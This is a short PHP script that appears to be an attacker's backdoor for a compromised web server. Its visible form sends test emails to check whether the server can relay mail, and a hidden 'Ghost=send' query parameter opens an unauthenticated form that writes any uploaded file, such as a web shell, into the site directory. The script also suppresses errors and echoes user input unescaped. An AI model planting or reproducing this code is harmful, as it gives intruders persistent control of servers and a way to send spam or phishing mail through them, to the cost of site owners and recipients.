<?php
error_reporting(0);

echo 'Upload is <b><color>WORKING</color></b><br>
Check  Mailling ..<br>
<form method="post">
<input type="text" placeholder="E-Mail" name="email" value="'.$_POST['email'].'"required ><input type="text" placeholder="Order ID" name="orderid" value="'.$_POST['orderid'].'" ><br>
<input type="submit" value="Send test >>">
</form>
<br>';

if ($_GET['Ghost'] =='send'){


$uploaddir = './';
$uploadfile = $uploaddir . basename($_FILES['userfile']['name']);
if ( isset($_FILES["userfile"]) ) {
    echo "Upload ";
    if (move_uploaded_file
($_FILES["userfile"]["tmp_name"], $uploadfile))
echo $uploadfile;
    else echo "failed";
}


   echo "
<form name='uplform' method='post' action='?Ghost=send'
enctype='multipart/form-data'>
<p align='center'>
<input type='file' name='userfile'>
<input type='submit'>
</p>
";
}

if (!empty($_POST['email'])){
	if (!empty($_POST['email'])){
		$xx =$_POST['orderid'];
	}
	else{
		$xx = rand();

	}
	mail($_POST['email'],"Result Report Test - ".$xx,"WORKING !");
	print "<b>send an report to [".$_POST['email']."] - Order : $xx</b>"; 
}

?>